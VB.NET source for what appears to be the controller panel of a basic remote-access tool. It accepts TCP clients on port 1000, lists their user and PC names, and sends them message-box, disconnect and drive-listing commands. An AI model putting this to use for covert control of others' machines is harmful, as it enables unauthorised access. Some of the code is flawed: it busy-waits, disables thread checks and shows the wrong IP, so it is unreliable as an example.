Imports System.ComponentModel
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading


Partial Public Class Form1
    Public Sub New()
        InitializeComponent()
    End Sub


    'Variaveis

    Dim Total As Integer = 1000
    Public Socket(Total) As Socket
    Dim TcpListener As TcpListener
    Private List As New List(Of Integer)
    Public Separador As String = "||"


    'Carrega o form
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        Me.ListView1.Columns.Add("User", 100, HorizontalAlignment.Left).Name = "Columns0"
        Me.ListView1.Columns.Add("Pc", 100, HorizontalAlignment.Left).Name = "Columns1"
        Me.ListView1.Columns.Add("IP", 100, HorizontalAlignment.Left).Name = "Columns2"
        ReDim Socket(Total)
        TcpListener = New TcpListener(IPAddress.Any, 1000) ' 1000 é a porta
        TcpListener.Start()
        Dim T As New Thread(New ThreadStart(Sub() verificar()))
        T.Start()
    End Sub


    'Verifica se tem algum cliente conectado
    Private Sub verificar()
        While True
            If TcpListener.Pending Then
                Dim ID As Integer = List.Count
                Socket(ID) = TcpListener.AcceptSocket
                List.Add(ID + 1)

                Dim T As New Thread(New ThreadStart(Sub() conexao(ID)))
                T.Start()
            End If
        End While
    End Sub


    'Mantem a conexao com o cliente
    Private Sub conexao(ByVal sock As Integer)
        While True
            Try
                Socket(sock).Poll(-1, SelectMode.SelectRead)
                If Socket(sock).Available <= 0 Then
                    If Socket(sock).Receive(New Byte(1) {}, SocketFlags.Peek) = 0 Then
                        Exit While
                    Else
                        Continue While
                    End If
                End If
                Dim Buffer As Byte() = New Byte(Socket(sock).Available - 1) {}
                Socket(sock).Receive(Buffer, 0, Buffer.Length, SocketFlags.None)
                Dim T As New Thread(New ThreadStart(Sub() Data(sock, Buffer)))
                T.Start()
            Catch ex As Exception
                Exit While
            End Try
        End While
        Dim T1 As New Thread(New ThreadStart(Sub() Remove(sock)))
        T1.Start()
    End Sub


    'Remove o cliente da lista

    Private Sub Remove(ByVal sock As Integer)
        For Each x As ListViewItem In Me.ListView1.Items
            Application.DoEvents()
            Thread.Sleep(1)
            If CType(x.ToolTipText, Integer) = sock Then
                List.Remove(sock)
                x.Remove()
                Exit For
            End If
        Next x
    End Sub


    'Recebe os bytes do cliente
    Private Sub Data(ByVal sock As Integer, ByVal buffer As Byte())
        Try
            If Me.InvokeRequired Then
                Me.Invoke(New Action(Sub() Data(sock, buffer)))
                Exit Sub
            End If
            Dim Pegar As String() = Split(Encoding.Default.GetString(buffer), Separador)
            Select Case Pegar(0)
                Case "Conectado+1"
                    Dim L1 As New ListViewItem
                    With L1
                        Dim user As String = Pegar(1)
                        Dim pc As String = Pegar(2)
                        .Text = user
                        .SubItems.Add(pc)
                        .SubItems.Add(Socket(sock).LocalEndPoint.ToString)
                        .ToolTipText = sock
                    End With
                    Me.ListView1.Items.Add(L1)
                Case "FileManagerOpenForm"
                    Dim F As FileManager = DirectCast(My.Application.OpenForms("FileManager" & sock), FileManager)
                    If F Is Nothing Then
                        Dim Open As New FileManager
                        With Open
                            .Text = ""
                            .Name = "FileManager" & CType(sock, String)
                            .sock = sock
                            .ListView1.Columns.Add("Name", 100, HorizontalAlignment.Left).Name = "Columns0"
                            .ListView1.FullRowSelect = True
                            .ListView1.MultiSelect = True
                            .Show()
                            Socket(sock).Send(Encoding.Default.GetBytes("FileManagerGetDrives" & Separador))
                        End With
                    End If
                Case "FileManagerGetDrives"
                    Dim F As FileManager = DirectCast(My.Application.OpenForms("FileManager" & sock), FileManager)
                    If F IsNot Nothing Then
                        F.ListView1.Items.Clear()
                        For x As Integer = 0 To Split(Pegar(1), "|*|").Count - 1
                            Dim L1 As New ListViewItem
                            With L1
                                L1.Text = Split(Pegar(1), "|*|")(x)
                            End With
                            F.ListView1.Items.Add(L1)
                        Next x

                    End If
            End Select
        Catch ex As Exception
        End Try
    End Sub


    'Botao pra enviar MessageBox
    Private Sub SendMsgboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendMsgboxToolStripMenuItem.Click
        For Each x As ListViewItem In Me.ListView1.SelectedItems
            Dim box As String = InputBox("TXT", "", "")
            Socket(x.ToolTipText).Send(Encoding.Default.GetBytes("msgbox" & Separador & box & Separador))
        Next x
    End Sub



    'Botao para fechar a conexao
    Private Sub CloseConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseConnectionToolStripMenuItem.Click
        For Each x As ListViewItem In Me.ListView1.SelectedItems
            Socket(x.ToolTipText).Send(Encoding.Default.GetBytes("fechar" & Separador))
        Next
    End Sub


    'Simplesmente para fechar o programa
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub

    'Botao para abrir o file manager
    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each x As ListViewItem In Me.ListView1.SelectedItems
            Socket(x.ToolTipText).Send(Encoding.Default.GetBytes("FileManager" & Separador))
        Next
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged

    End Sub
End Class
